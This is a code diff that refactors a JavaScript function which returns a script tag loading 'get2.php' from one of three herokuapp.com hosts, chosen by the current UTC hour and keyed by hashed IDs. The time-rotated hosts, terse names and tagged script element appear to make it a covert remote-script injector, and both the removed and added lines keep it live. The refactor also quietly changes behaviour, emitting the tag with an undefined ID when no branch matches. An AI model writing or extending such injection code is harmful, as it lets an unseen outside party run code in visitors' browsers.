@@ -163,37 +163,43 @@ function mBV(s,b,t,a){
  var nH=nD.getUTCHours();
 
  if(nH<8){
-	 if(s=='s'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
-	 }
-	 if(s=='b'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
-	 }
-	 if(s=='m'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
-	 }
+	if(s=='s'&&t!=0){
+	 	var aId='072dd228c519a31a4894e0005b4f3ad6';
+	}
+	if(s=='b'&&t!=0){
+	 	var aId='4ee7ba830860b984f54c5068ef2ff111';
+	}
+	if(s=='m'&&t!=0){
+	 	var aId='a15faa52c7e806cd608a2959fe0fe760';
+	}
+
+	return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a='+aId+'\"><\/script>'+bEn;
  }
  if(nH>=8 && nH<16){
-	 if(s=='s'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
-	 }
-	 if(s=='b'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
-	 }
-	 if(s=='m'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
-	 }
+	if(s=='s'&&t!=0){
+	 	var aId='072dd228c519a31a4894e0005b4f3ad6';
+	}
+	if(s=='b'&&t!=0){
+	 	var aId='4ee7ba830860b984f54c5068ef2ff111';
+	}
+	if(s=='m'&&t!=0){
+	 	var aId='a15faa52c7e806cd608a2959fe0fe760';
+	}
+
+	return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a='+aId+'\"><\/script>'+bEn;
  }
  if(nH>=16){
-	 if(s=='s'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://radiant-everglades-72351.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
-	 }
-	 if(s=='b'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://radiant-everglades-72351.herokuapp.com/get2.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
-	 }
-	 if(s=='m'&&t!=0){
-		 return bSt+'<script id="yp_1391" src=\"https://radiant-everglades-72351.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
-	 }
+	if(s=='s'&&t!=0){
+	 	var aId='072dd228c519a31a4894e0005b4f3ad6';
+	}
+	if(s=='b'&&t!=0){
+	 	var aId='4ee7ba830860b984f54c5068ef2ff111';
+	}
+	if(s=='m'&&t!=0){
+	 	var aId='a15faa52c7e806cd608a2959fe0fe760';
+	}
+
+	return bSt+'<script id="yp_1391" src=\"https://radiant-everglades-72351.herokuapp.com/get2.php?a='+aId+'\"><\/script>'+bEn;
  }
 
 }
